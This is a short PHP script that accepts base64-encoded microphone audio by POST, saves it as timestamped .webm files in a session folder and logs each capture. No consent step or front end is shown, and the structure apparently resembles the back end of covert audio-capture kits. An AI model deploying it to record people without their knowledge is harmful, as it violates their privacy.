<?php
require_once __DIR__ . '/session_helper.php';

$date = date('dMYHis');
$audioData = isset($_POST['audio']) ? $_POST['audio'] : '';

if (!empty($audioData)) {
    $filteredData = substr($audioData, strpos($audioData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = $session_dir . 'audio' . $date . '.webm';
    $fp = fopen($filename, 'wb');
    if ($fp) {
        fwrite($fp, $unencodedData);
        fclose($fp);
    }
    error_log("Audio captured\r\n", 3, $session_dir . 'AudioLog.log');
}

header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
exit();
?>
